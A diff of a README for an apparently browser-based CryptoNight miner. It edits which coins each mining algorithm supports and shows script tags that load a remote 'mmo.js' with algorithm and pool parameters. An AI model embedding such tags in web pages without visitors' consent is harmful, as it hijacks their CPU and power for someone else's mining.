@@ -41,11 +41,11 @@ Win UWP: https://www.microsoft.com/store/apps/9NQ95K22H2ZB?ocid=badge
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn-lite/1?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
-#### Examples: CN Pico Coins (ArQmA, BitcoinMono, Cypruscoin, Dero Gold, ElphyreCoin, HITC, Iridium, LightChain, Mangocoin, Obscure, Oscillate, Plenteum, Tellurium, Tritanium, TurtleCoin, TurtleGold, Worktips, WrkzCoin, XtendCash) need ?algo=cn-pico/trtl
+#### Examples: CN Pico Coins (ArQmA, BitcoinMono, Cypruscoin, Dero Gold, ElphyreCoin, HITC, Iridium, LightChain, Mangocoin, Obscure, Oscillate, Plenteum, Tellurium, Tritanium, TurtleGold, Worktips, WrkzCoin, XtendCash) need ?algo=cn-pico/trtl
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn-pico/trtl?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
-#### Examples: Argon2id - Chukwa Coins (TurtleCoin @ Block 1800000) need ?algo=chukwa
+#### Examples: Argon2id - Chukwa Coins (TurtleCoin) need ?algo=chukwa
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=chukwa?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
